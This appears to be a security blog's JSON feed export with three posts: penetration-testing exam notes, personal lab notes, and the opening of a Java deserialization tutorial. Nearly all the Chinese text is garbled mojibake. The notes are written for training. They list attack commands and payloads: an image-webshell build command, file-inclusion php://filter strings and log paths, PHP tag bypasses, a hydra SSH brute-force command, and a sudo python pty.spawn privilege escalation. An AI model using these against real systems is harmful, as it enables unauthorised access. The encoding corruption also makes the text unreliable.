æŒ‡å®šäº†è®¿é—®URLä¸Šçš„/cgi-b/ç›®å½•æ—¶ï¼Œä¼šåœ¨æœ¬åœ°${SRVROOT}/cgi-bin/ä¸‹æŸ¥æ‰¾ç›¸åº”è„šæœ¬ï¼ˆè„šæœ¬åç¼€éœ€è¦åœ¨httpd.confæ³¨å†Œï¼Œéœ€è¦é…ç½® Shebang è¡Œï¼‰\nFastCGIæ¨¡å¼ï¼ˆçŒœæµ‹ ä¼šé¢„å…ˆå¤„ç†å¥½è„šæœ¬ï¼‰ï¼Œè¿è¡Œè„šæœ¬åä¸ç»“æŸè¿è¡Œï¼ˆCGIæ¯æ¬¡è®¿é—®éƒ½ä¼šforkä¸€æ¬¡è¿›ç¨‹ï¼‰\nè¿˜æœ‰å…¶ä»–CGIæ¨¡å¼\n7.3.4nts éœ€è¦é‡å¯ æ‰èƒ½ç”Ÿæ•ˆ\n.htaccess\nåˆ©ç”¨æœ‰æ¡ä»¶\n1.mod_rewriteæ¨¡å—å¼€å¯ã€‚\n2.AllowOverride All\næ„é€ å›¾ç‰‡é©¬å‘½ä»¤\ncopy 1.jpg/a+2.php/b 3.jpg\næ¡ä»¶ç«äº‰\nå…ˆä¸Šä¼ å†åˆ é™¤ï¼ˆç§»åŠ¨ï¼Œé‡å‘½åï¼Ÿï¼‰\nbpå°±å¯ä»¥ä¸€ç›´ä¸Šä¼ ï¼Œç„¶åæ‰‹åŠ¨åˆ·æ–°é¡µé¢è®¿é—®å³å¯\näºŒæ¬¡æ¸²æŸ“\nä¸Šä¼ åçš„æ–‡ä»¶é‡æ–°æ ¹æ®æ–‡ä»¶å¤§å°ï¼Ÿå›¾ç‰‡è§„åˆ™ï¼Ÿé‡æ–°ç”Ÿæˆå›¾ç‰‡\næ¼æ´åœ¨äºé‡æ–°ç”Ÿæˆçš„éƒ¨åˆ†è¿˜æ˜¯æœ‰ä¿ç•™éƒ¨åˆ†æºæ–‡ä»¶ï¼ŒæŠŠæœ¨é©¬æ”¾åˆ°æ²¡è¢«æ”¹å˜çš„åœ°æ–¹å°±OK\næ–‡ä»¶åŒ…å« æ—¥å¿—è·¯å¾„ï¼š\n1 2 3 /var/log/apache2/access.log (access_log) error.log error_log /var/log/httpd/access.log /var/log/nginx/error.log ä¼ªåè®®ï¼š\nphp://filter/convert.base64-encode/resource=../file.php\nphp://filter/read=convert.base64-encode/resource=../file.php\nPythonä¸´æ—¶httpæœåŠ¡\n1 2 python2 -m SimpleHTTPServer 8000 python3 -m http.server 9000 å¯ä»¥è®¿é—®è¢«åŒ…å«çš„æ–‡ä»¶ï¼Œè·å¾—æ›´å¤šä¿¡æ¯\nBPçˆ†ç ´æ¨¡å¼ sniper:æŒ‰ç…§å­—å…¸é¡ºåºä¸€ä¸ªä¸€ä¸ªå‚æ•°ä¾æ¬¡éå†ï¼Œä¸€ä¸ªå‚æ•°éå†å®Œ,å†éå†ä¸‹ä¸€ä¸ªå‚æ•° battering ram:æ¯ä¸ªå‚æ•°åŒæ—¶éå†åŒä¸€ä¸ªå­—å…¸ pitchfork:å¤šä¸ªå‚æ•°åŒæ—¶è¿›è¡Œéå†,åªæ˜¯ä¸€ä¸ªé€‰æ‹©å­—å…¸1ï¼Œä¸€ä¸ªé€‰æ‹©å­—å…¸2 Clusterbomb:æœ‰ç‚¹åƒä¸¤ä¸ªåµŒå¥—çš„forå¾ªç¯ï¼Œå‚æ•°iå’Œå‚æ•°jï¼Œi=0ï¼Œç„¶åjè¦ä»0-10å…¨éƒ¨è·‘å®Œï¼Œç„¶åi=1ï¼Œç„¶åjå†ä»0-10è·‘å®Œï¼Œä¸€å¯¹å¤šï¼Œå¤šæ¬¡éå†\nPHPæ ‡ç­¾ç»•è¿‡ 1 2 3 4 5 \u0026lt;? echo \u0026#39;123\u0026#39;;?\u0026gt; #å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on \u0026lt;?=(è¡¨è¾¾å¼)?\u0026gt; ç­‰ä»·äº \u0026lt;?php echo (è¡¨è¾¾å¼)?\u0026gt; #ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½® \u0026lt;% echo \u0026#39;123\u0026#39;;%\u0026gt; #å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œå¹¶ä¸”åªèƒ½åœ¨7.0ä»¥ä¸‹ç‰ˆæœ¬ä½¿ç”¨ \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;echo \u0026#39;123\u0026#39;; \u0026lt;/script\u0026gt; #ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚ \u0026lt;?PHP ?\u0026gt; #å¤§å†™ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ŒEVALå‡½æ•°ä¹Ÿå¯ä»¥å¤§å†™ XSS \u0026lt;script\u0026gt;æ ‡ç­¾å¯ä»¥éƒ¨åˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œç»•è¿‡\n","date":"2023-09-07T00:00:00Z","permalink":"https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/","title":"PTEçŸ¥è¯†è®°å½•"},{"content":"æ‘˜è¦\næ¸—é€æµ‹è¯•ä¸ªäººç»éªŒ ssh sshçˆ†ç ´ sshçˆ†ç ´ä½¿ç”¨å·¥å…· hydra ï¼Œä¸»è¦å› ä¸ºå¿«é€Ÿï¼Œå…¶ä»–å·¥å…·é€Ÿåº¦è¿‡æ…¢\nä½¿ç”¨hydraçˆ†ç ´ï¼š\n1 hydra -l ezpd -P 1.txt 192.168.229.129 ssh -v 1 2 3 4 5 -l æŒ‡å®šç”¨æˆ·å -L æŒ‡å®šç”¨æˆ·åå­—å…¸æ–‡ä»¶ -p æŒ‡å®šå¯†ç  -P æŒ‡å®šå¯†ç å­—å…¸æ–‡ä»¶ -v æ˜¾ç¤ºè¯¦ç»†çš„æ‰§è¡Œè¿‡ç¨‹ sshå¯†ç ç”Ÿæˆ sshå¯†ç ç”Ÿæˆå·¥å…· crunch\ncat /usr/share/crunch/charset.lst é€‰æ‹©è¦ä½¿ç”¨çš„crunchå­—å…¸å­—ç¬¦é›†èŒƒå›´\næ‰¾åˆ°åˆé€‚çš„å­—ç¬¦é›†ï¼Œç„¶åä½¿ç”¨\n1 crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ \u0026gt; pass.dic å…³äºä¸Šé¢å‘½ä»¤çš„ç–‘é—® @æ›¿ä»£æœªçŸ¥å­—ç¬¦æœªçŸ¥ï¼Ÿ\nLinuxå¸¸ç”¨å‘½ä»¤ é‡åˆ°ä¸€ä¸ªè¢«é™åˆ¶çš„shellï¼Œæƒ³è¦æ•´ç†ä¸€ä¸ªå‘½ä»¤æ¸…å•ï¼ŒåæœŸæƒ³åŠæ³•çˆ†ç ´ä¸€ä¸‹æœ‰å“ªäº›å‘½ä»¤å¯ä»¥ä½¿ç”¨\nä¸»è¦å‚è€ƒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 ls #\tåˆ—å‡ºç›®å½•çš„å†…å®¹ alias #\tå®šä¹‰æˆ–æ˜¾ç¤ºåˆ«å unalias #\tåˆ é™¤åˆ«åå®šä¹‰ pwd #\tæ‰“å°å·¥ä½œç›®å½• cd #\tæ›´æ”¹ç›®å½• cat #\tè¯»å–æ–‡ä»¶ more #\tæŸ¥çœ‹ä¸€ä¸ªé•¿æ–‡ä»¶çš„å†…å®¹ less #\tæŸ¥çœ‹ä¸€ä¸ªé•¿æ–‡ä»¶çš„å†…å®¹ ä½†æ˜¯å®ƒå…è®¸åœ¨æ–‡ä»¶ä¸­å’Œæ­£å‘æ“ä½œä¸€æ ·çš„åå‘æ“ä½œ head #\thead -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å‰ä¸¤è¡Œ tail #\ttail -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„æœ€åä¸¤è¡Œ tac #\tä»æœ€åä¸€è¡Œå¼€å§‹åå‘æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ cp #\tå¤åˆ¶æ–‡ä»¶å’Œç›®å½• rm #\tåˆ é™¤æ–‡ä»¶å’Œç›®å½• mv #\tç§»åŠ¨ï¼ˆé‡å‘½åï¼‰æ–‡ä»¶å’Œç›®å½• mkdir #\tåˆ›å»ºç›®å½• man #\tæ˜¾ç¤ºå…¶ä»–å‘½ä»¤çš„æ‰‹å†Œé¡µé¢ touch #\tåˆ›å»ºç©ºæ–‡ä»¶ groupadd #\tåˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ç»„ groupdel #\tåˆ é™¤ä¸€ä¸ªç”¨æˆ·ç»„ groupmod #\té‡å‘½åä¸€ä¸ªç”¨æˆ·ç»„ useradd #\tåˆ›å»ºç”¨æˆ· userdel #\tåˆ é™¤ç”¨æˆ· usermod #\tä¿®æ”¹ç”¨æˆ·å±æ€§ chage #\tï¼ˆ-E 2005-12-31 user1 è®¾ç½®ç”¨æˆ·å£ä»¤çš„å¤±æ•ˆæœŸé™ ï¼‰ pwck #\tæ£€æŸ¥ \u0026#39;/etc/passwd\u0026#39; çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç”¨æˆ· grpck #\tæ£€æŸ¥ \u0026#39;/etc/passwd\u0026#39; çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç¾¤ç»„ newgrp #\t(newgrp group_name ç™»é™†è¿›ä¸€ä¸ªæ–°çš„ç¾¤ç»„ä»¥æ”¹å˜æ–°åˆ›å»ºæ–‡ä»¶çš„é¢„è®¾ç¾¤ç»„ ) chmod #\tæ›´æ”¹æ–‡ä»¶æƒé™ chown #\tæ›´æ”¹æ–‡ä»¶æ‹¥æœ‰è€… chattr #\tæ–‡ä»¶çš„ç‰¹æ®Šå±æ€§ lsattr #\tæ˜¾ç¤ºæ–‡ä»¶çš„ç‰¹æ®Šå±æ€§ sudo #\tä»¥è¶…çº§ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ su #\tåˆ‡æ¢ç”¨æˆ· htop #\tæ˜¾ç¤ºè¿›ç¨‹å’Œèµ„æºä¿¡æ¯ unzip #\tè§£å‹zipæ–‡ä»¶ echo #\tæ˜¾ç¤ºæ–‡æœ¬è¡Œ cat #\tæ‰“å°æ–‡ä»¶å†…å®¹ ps #\tæŠ¥å‘Šshellè¿›ç¨‹çŠ¶æ€ kill #\tç»ˆæ­¢ç¨‹åº ping #\tæµ‹è¯•ç½‘ç»œè¿æ¥ history #\tæ˜¾ç¤ºä»¥å‰çš„å‘½ä»¤åˆ—è¡¨ passwd #\tæ›´æ”¹ç”¨æˆ·å¯†ç  which #\tè¿”å›ç¨‹åºçš„å®Œæ•´äºŒè¿›åˆ¶è·¯å¾„ shred #\tè¦†ç›–æ–‡ä»¶ä»¥éšè—å…¶å†…å®¹ grep #\tæ‰“å°ä¸ç»™å®šæ¡ä»¶åŒ¹é…è¡Œ sort #\tæ’åºæ–‡ä»¶çš„å†…å®¹ comm #\tå¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶å†…å®¹ ifconfig #\tæ˜¾ç¤ºç½‘ç»œé…ç½® netstat #\tç«¯å£æŸ¥çœ‹ï¼Ÿ nslookup #\tæŸ¥çœ‹DNSè§£æ whoami #\tè¾“å‡ºç”¨æˆ·å whatis #\tæ˜¾ç¤ºå•è¡Œè¯´æ˜ wc #\tå­—æ•°æ–‡ä»¶ paste #\tpaste file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ bunzip2 #\tè§£å‹è½¯ä»¶ bzip3 #\tåŒä¸Š bzip2 #\tåŒä¸Š gzip #\tåŒä¸Š lunzip #\tåŒä¸Š unzip #\tåŒä¸Š eb-utils #\tåŒä¸Š rzip #\tåŒä¸Š gunzip #\tåŒä¸Š rar #\tåŒä¸Š unrar #\tåŒä¸Š zip #\tåŒä¸Š unzip #\tåŒä¸Š uname #\tæ˜¾ç¤ºæ“ä½œç³»ç»Ÿä¿¡æ¯ neofetch #\tæ˜¾ç¤ºæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ä¿¡æ¯ find #\tæœç´¢éµå¾ªæ¨¡å¼çš„æ–‡ä»¶ sed #\tæ¯æ¬¡ä»…è¯»å–ä¸€è¡Œå†…å®¹ï¼ˆè¯»å–æ–‡ä»¶ï¼‰ ssh #\tsshè¿œç¨‹ç™»å½• ftp #\tè®¿é—®ftpæœåŠ¡å™¨ wget #\tä»äº’è”ç½‘æ£€ç´¢æ–‡ä»¶ file #\tæŸ¥çœ‹æ–‡ä»¶ç±»å‹ export #\tç¯å¢ƒå˜é‡ç›¸å…³ apt #\tåŒ…ç®¡ç†å™¨ï¼ˆä¸‹è½½å®‰è£…å·¥å…·ï¼‰ yum #\tåŒä¸Š rpm #\tåŒä¸Š pacman #\tåŒä¸Š dpkg #\tå¥½åƒä¹Ÿæ˜¯åŒä¸Š arch #\tæ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„ dmidecode #\tæ¨èå‚æ•°ï¼ˆ-qï¼‰ æ˜¾ç¤ºç¡¬ä»¶ç³»ç»Ÿéƒ¨ä»¶ - (SMBIOS / DMI) hdparm #\tï¼ˆ-iï¼‰ /dev/hda ç½—åˆ—ä¸€ä¸ªç£ç›˜çš„æ¶æ„ç‰¹æ€§ï¼ˆ-tT /dev/sdaï¼‰ åœ¨ç£ç›˜ä¸Šæ‰§è¡Œæµ‹è¯•æ€§è¯»å–æ“ä½œ lspci #\tï¼ˆ-tvï¼‰ç½—åˆ— PCI è®¾å¤‡ ï¼ˆ-tvï¼‰æ˜¾ç¤º USB è®¾å¤‡ date #\tæ˜¾ç¤ºç³»ç»Ÿæ—¥æœŸ cal #\tï¼ˆcal 2007ï¼‰ æ˜¾ç¤º2007å¹´çš„æ—¥å†è¡¨ clock #\tï¼ˆ-wï¼‰å°†æ—¶é—´ä¿®æ”¹ä¿å­˜åˆ° BIOS tree #\tæ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„ ostree #\tæ“ä½œç³»ç»Ÿæ ‘ pstree #\tè¿›ç¨‹æ ‘ iconv #\tåˆ—å‡ºå·²çŸ¥çš„ç¼–ç  locate #\tæ–‡ä»¶æœç´¢ whereis #\tæ–‡ä»¶æœç´¢ï¼ˆæ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€æºç æˆ–mançš„ä½ç½® ï¼‰ which #\tæ–‡ä»¶æœç´¢ï¼ˆæ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ ï¼‰ mount #\tæŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ umount #\tå¸è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ fuser #\tå½“è®¾å¤‡ç¹å¿™æ—¶å¼ºåˆ¶å¸è½½ df #\tï¼ˆ-h æ˜¾ç¤ºå·²ç»æŒ‚è½½çš„åˆ†åŒºåˆ—è¡¨ ï¼‰ du #\tï¼ˆ-sh dir1 ä¼°ç®—ç›®å½• \u0026#39;dir1\u0026#39; å·²ç»ä½¿ç”¨çš„ç£ç›˜ç©ºé—´\u0026#39; ï¼‰ ln #\tåˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„è½¯é“¾æ¥ 1 2 vim #\té«˜æ•ˆæ–‡æœ¬ç¼–è¾‘ vi #\tåŒä¸Š ä¸‹é¢æ˜¯ä¸è¦è½»æ˜“å°è¯•çš„\n1 2 3 4 5 shutdown #\tå…³é—­æ‚¨çš„æœºå™¨ reboot #\té‡å¯ logout #\tæ³¨é”€ telinit #\tå…³æœºç›¸å…³å‘½ä»¤ exit #\té€€å‡ºå½“å‰shellä¼šè¯ OKï¼Œå‘ç°ç›²ç‚¹ï¼šæœ¬æ¬¡é¶æœºsshç™»å½•åï¼Œæ— è¾“å…¥ç›´æ¥ä¸¤æ¬¡tabé”®å³å¯æŸ¥çœ‹å¯ç”¨å‘½ä»¤\nå—é™shellé€ƒé€¸ å‚è€ƒæ–‡ç« \né¡¾åæ€ä¹‰ï¼šå—é™åˆ¶çš„shellï¼Œæœ‰ä»¥ä¸‹åŠŸèƒ½å—é™ï¼ˆå¯ä»¥è®¾ç½®æŸäº›é€‰é¡¹ä¸å—é™ï¼‰\nWikiPediaä¸Šæœ‰æåˆ°å—é™shellçš„å¼±ç‚¹\nA user can break out of the restricted environment by running a program that features a shell function ç”¨æˆ·å¯ä»¥é€šè¿‡è¿è¡Œå…·æœ‰shellåŠŸèƒ½çš„ç¨‹åºæ¥æ‰“ç ´é™åˆ¶ç¯å¢ƒ\nLinux è‡ªå¸¦ç¨‹åºé‡Œvi/vimæœ‰ç±»ä¼¼åŠŸèƒ½ï¼Œå½“ç„¶å¦‚æœèƒ½å¤Ÿå†å¼€ä¸€ä¸ªshellä¹Ÿèƒ½è¾¾åˆ°ç›¸åŒç›®çš„\nå®æˆ˜é¶æœºé‡Œé€ƒé€¸æ‰€ç”¨è¯­å¥ï¼š\næ‰¾ä¸åˆ°æ‰§è¡Œçš„å‘½ä»¤ å°è¯•å®Œæ•´è·¯å¾„æ‰§è¡Œå‘½ä»¤å¦‚/bin/whoami\næœ€å¥½è¿˜æ˜¯è®¾ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nsudoersæƒé™æŸ¥çœ‹ å‘½ä»¤çš„è¯ç›´æ¥sudo -læŸ¥çœ‹å°±OKäº†\næƒé™ç®¡ç†æ–‡ä»¶æ˜¯/etc/sudoers\nsudoersæ–‡ä»¶ç¼–è¾‘ç»“æ„\nu002 ä»£è¡¨å¯¹ u002 ç”¨æˆ·çš„æƒé™ç¼–è¾‘\nç¬¬ä¸€ä¸ª ALL ä»£è¡¨ç½‘ç»œä¸­çš„ä¸»æœºï¼ˆå…·ä½“çš„æƒé™æ§åˆ¶ï¼Œæ ¹æ®åˆæ­¥é˜…è¯»å¯ä»¥è®¾ç½®ä¸ºæœºå™¨ç»„ã€‚è¿™äº›å¯èƒ½åŒ…æ‹¬ä¸»æœºå(å¯é€‰æ‹©ä½¿ç”¨é€šé…ç¬¦)ã€IPåœ°å€ã€ç½‘ç»œå·ç æˆ–ç½‘ç»œç»„ã€‚ï¼‰\nGroups of machines. These may include host names (optionally with wildcards) IP addresses, network numbers or netgroups.\nç¬¬äºŒä¸ª ALL è§„å®šå¯ä»¥ä½¿ç”¨è°çš„èº«ä»½å»æ‰§è¡Œå‘½ä»¤ ï¼ˆç›®å‰å‘ç° å¦‚æœæ˜¯rootçš„è¯å°±å¯ä»¥ä½¿ç”¨rootæƒé™æ‰§è¡Œå‘½ä»¤ ï¼‰\nå¦‚æœè®¾ç½®äº† NOPASSWD å¯ä»¥å…å¯†æ‰§è¡Œ\nç¬¬ä¸‰ä¸ª ALL è§„å®šå¯ä»¥ä½¿ç”¨ï¼ˆæŒ‡å®šèº«ä»½ï¼‰æ‰§è¡Œçš„å‘½ä»¤\nå¦‚æœæ˜¯å¦‚ä¸‹æƒé™è®¾ç½®çš„è¯ï¼Œå°±å¯ä»¥ä½¿ç”¨ python ä¸€å¥è¯ææƒ\nsudo python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\nå…¶ä»–é…ç½®åå¯ä»¥ä½¿ç”¨rootæƒé™çš„æ–¹å¼\n","date":"2023-06-25T00:00:00Z","permalink":"https://d4n-sec.github.io/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AA%E4%BA%BA%E7%BB%8F%E9%AA%8C/","title":"æ¸—é€æµ‹è¯•ä¸ªäººç»éªŒ"},{"content":"æœ¬ç« æ˜¯ D4nçš„Javaå®‰å…¨å…¥é—¨ ç¬¬ä¸€ç¯‡ï¼Œæœ›å¤§ä½¬æŒ‡æ­£ï¼Œå°ç™½é¿å‘\næµ‹è¯•ç”¨Javaç‰ˆæœ¬ï¼ˆ17.0.6ï¼‰\nJavaååºåˆ—åŒ– ä»€ä¹ˆæ˜¯ååºåˆ—åŒ– â€‹\tå€Ÿç”¨ä¸€ä¸‹å¤§ä½¬çš„æè¿°ï¼š\nJavaæè¿°çš„æ˜¯ä¸€ä¸ªâ€˜ä¸–ç•Œâ€™ï¼Œç¨‹åºè¿è¡Œå¼€å§‹æ—¶ï¼Œè¿™ä¸ªâ€˜ä¸–ç•Œâ€™ä¹Ÿå¼€å§‹è¿ä½œï¼Œä½†â€˜ä¸–ç•Œâ€™ä¸­çš„å¯¹è±¡ä¸æ˜¯ä¸€æˆä¸å˜çš„ï¼Œå®ƒçš„å±æ€§ä¼šéšç€ç¨‹åºçš„è¿è¡Œè€Œæ”¹å˜ã€‚ ä½†å¾ˆå¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ä¿å­˜æŸä¸€åˆ»æŸä¸ªå¯¹è±¡çš„ä¿¡æ¯ï¼Œæ¥è¿›è¡Œä¸€äº›æ“ä½œã€‚æ¯”å¦‚åˆ©ç”¨ååºåˆ—åŒ–å°†ç¨‹åºè¿è¡Œçš„å¯¹è±¡çŠ¶æ€ä»¥äºŒè¿›åˆ¶å½¢å¼å‚¨å­˜ä¸æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œç„¶åå¯ä»¥åœ¨å¦ä¸€ä¸ªç¨‹åºä¸­å¯¹åºåˆ—åŒ–åçš„å¯¹è±¡çŠ¶æ€æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ¢å¤å¯¹è±¡ã€‚å¯ä»¥æœ‰æ•ˆåœ°å®ç°å¤šå¹³å°ä¹‹é—´çš„é€šä¿¡ã€å¯¹è±¡æŒä¹…åŒ–å­˜å‚¨ã€‚\nåºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ˜¯è®©Javaå¯¹è±¡è„±ç¦»Javaè¿è¡Œç¯å¢ƒçš„ä¸€ç§æ‰‹æ®µï¼Œå¯ä»¥æœ‰æ•ˆçš„å®ç°å¤šå¹³å°ä¹‹é—´çš„é€šä¿¡ã€å¯¹è±¡æŒä¹…åŒ–å­˜å‚¨ã€‚\nâ€‹\tç”¨è‡ªå·±çš„è¯è¯´å°±æ˜¯ï¼Œå¦‚æœéœ€è¦ä¼ è¾“ä¸€ä¸ªå¯¹è±¡ï¼ˆæˆ–æ˜¯ä¸€æ®µæ•°æ®ï¼‰ç»™ç›®æ ‡ï¼ˆé€”å¾„å¯ä»¥æ˜¯ç½‘ç»œï¼Œè¿›ç¨‹é—´ç­‰ä»»ä½•å¯ä»¥ä¼ è¾“æ•°æ®çš„åœ°æ–¹ï¼Œç›®æ ‡å¯ä»¥æ˜¯å®¢æˆ·ç«¯ï¼Œå­è¿›ç¨‹ï¼Œçº¿ç¨‹ç­‰ï¼‰éœ€è¦å°†å¯¹è±¡çš„ä¸€äº›æˆ–è€…æ‰€æœ‰ä¿¡æ¯ä»¥ä¸€ç§æ ¼å¼ä¼ è¾“ç»™ç›®æ ‡ï¼Œæ¯”å¦‚å¸¸è§çš„JSONã€XMLã€YAMLæ ¼å¼ï¼Œå°±æ˜¯å°†ä¸€äº›æ•°æ®æ ¼å¼åŒ–ä¸ºç›¸åº”æ ‡å‡†æ ¼å¼çš„ä¾‹å­\nâ€‹\tè¿™ç§å°†æ•°æ®æ ¼å¼æ ‡å‡†åŒ–çš„è¿‡ç¨‹å°±å¯ä»¥ç§°ä¹‹ä¸ºåºåˆ—åŒ–ï¼Œè€Œå¯¹åº”çš„ï¼Œç›®æ ‡æ¥æ”¶åˆ°è¿™ç§æ ¼å¼åŒ–æ•°æ®ä¹‹åï¼Œå°†å¯¹è±¡æˆ–è€…æ•°æ®è¿˜åŸæˆåŸæœ¬æˆ–è€…éœ€è¦çš„æ ·å­å°±ç§°ä¸ºååºåˆ—åŒ–ã€‚\nâ€‹\tåœ¨Javaä¸­æƒ³è¦åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š\nè¯¥ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£ã€‚ è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚ â€‹\tåªæœ‰å®ç°äº†Serializableæˆ–Externalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚ â€‹\tæ³¨ï¼šExternalizable æ˜¯ç»§æ‰¿äº†Serializableçš„æŠ½è±¡ç±»\nâ€‹\tæ‰€ä»¥ä½ æƒ³çŸ¥é“ä¸€ä¸ªJavaæ ‡å‡†ç±»æ˜¯å¦æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå¯ä»¥æŸ¥çœ‹ä»–çš„ç±»æè¿°ï¼Œçœ‹æ˜¯å¦å®ç°äº†java.io.Serializableæ¥å£\nä¸ºä»€ä¹ˆè¦åºåˆ—åŒ– å¯¹è±¡ä¸åªæ˜¯å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå®ƒè¿˜éœ€è¦åœ¨ä¼ è¾“ç½‘ç»œä¸­è¿›è¡Œä¼ è¾“ï¼Œå¹¶ä¸”ä¿å­˜èµ·æ¥ä¹‹åä¸‹æ¬¡å†åŠ è½½å‡ºæ¥ï¼Œè¿™æ—¶å€™å°±éœ€è¦åºåˆ—åŒ–æŠ€æœ¯ã€‚\nJavaçš„åºåˆ—åŒ–æŠ€æœ¯å°±æ˜¯æŠŠå¯¹è±¡è½¬æ¢æˆä¸€ä¸²ç”±äºŒè¿›åˆ¶å­—èŠ‚ç»„æˆçš„æ•°ç»„ï¼Œç„¶åå°†è¿™äºŒè¿›åˆ¶æ•°æ®ä¿å­˜åœ¨ç£ç›˜æˆ–ä¼ è¾“ç½‘ç»œã€‚è€Œåéœ€è¦ç”¨åˆ°è¿™å¯¹è±¡æ—¶ï¼Œç£ç›˜æˆ–è€…ç½‘ç»œæ¥æ”¶è€…å¯ä»¥é€šè¿‡ååºåˆ—åŒ–å¾—åˆ°æ­¤å¯¹è±¡ï¼Œè¾¾åˆ°å¯¹è±¡æŒä¹…åŒ–çš„ç›®çš„ã€‚\nååºåˆ—åŒ–æ¼æ´æ¥æº å¼€å‘å¤±è¯¯\nå¼€å‘äººå‘˜å¹¶æ²¡æœ‰é‡å†™ObjectInputStreamç±»çš„resolveClassæ–¹æ³•ï¼Œæˆ–è€…é‡å†™è¿‡ä½†æ˜¯è¿‡æ»¤ä¸ä¸¥æ ¼å°±ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ ä½¿ç”¨äº†ä¸å®‰å…¨çš„åŸºç¡€åº“\nâ€‹\tå¾ˆå¤§æ¯”ä¾‹çš„ååºåˆ—åŒ–æ¼æ´æ˜¯å› ä½¿ç”¨äº†ä¸å®‰å…¨çš„åŸºç¡€åº“è€Œäº§ç”Ÿçš„ï¼Œä¸€èˆ¬ä¼˜ç§€çš„Javaå¼€å‘äººå‘˜ä¼šæŒ‰ç…§å®‰å…¨ç¼–ç¨‹è§„èŒƒè¿›è¡Œç¼–ç¨‹ï¼Œå¹¶ä¸”ä¸€äº›æˆç†Ÿçš„Javaæ¡†æ¶ Spring MVCã€Struts2ç­‰ä¼šæœ‰ç›¸åº”çš„é˜²èŒƒæœºåˆ¶ï¼Œå¦‚æœåªæ˜¯å¼€å‘å¤±è¯¯çš„è¯ï¼Œèƒ½é€ æˆçš„ååºåˆ—åŒ–æ¼æ´å¾ˆå°‘ â€‹\tä½†ä½¿ç”¨ä¸å®‰å…¨çš„åŸºç¡€åº“åˆ™ä¸ä¸€æ · â€‹ 2015å¹´ç”±é»‘å®¢Gabriel Lawrenceå’ŒChris Frohoffå‘ç°çš„Apache Commons Collectionsç±»åº“ç›´æ¥å½±å“äº†WebLogicã€WebSphereã€JBossã€Jenkinsã€OpenNMSç­‰å¤§å‹æ¡†æ¶ã€‚ç›´åˆ°ä»Šå¤©è¯¥æ¼æ´çš„å½±å“ä»æœªæ¶ˆæ•£ã€‚ å­˜åœ¨å±é™©çš„åŸºç¡€åº“ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 commons-fileupload 1.3.1 commons-io 2.4 commons-collections 3.1 commons-logging 1.2 commons-beanutils 1.9.2 org.slf4j:slf4j-api 1.7.21 com.mchange:mchange-commons-java 0.2.11 